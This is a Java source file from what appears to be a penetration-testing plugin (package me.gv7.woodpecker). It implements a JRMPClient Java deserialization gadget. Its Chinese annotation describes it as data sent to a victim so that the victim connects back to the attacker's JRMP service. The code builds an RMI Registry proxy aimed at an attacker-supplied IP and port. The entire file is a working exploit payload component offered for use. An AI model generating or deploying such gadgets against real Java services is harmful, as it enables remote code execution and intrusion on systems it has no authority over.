package me.gv7.woodpecker.plugin.gadgets.other;

import me.gv7.woodpecker.plugin.annotation.Description;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import me.gv7.woodpecker.plugin.gadgets.util.Reflections;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastRef;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

@Description("这是需要发送给受害者的数据，让受害者主动连接攻击机的JRMP服务。")
@RequireParameter("Ip,Port")
public class JRMPClient implements ObjectPayload {
    @Override
    public <T> Object getObject(Input input) throws Exception {
        String host = input.getIp();
        int port = Integer.parseInt(input.getPort());
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{
                Registry.class
        }, obj);
        return proxy;
    }
}
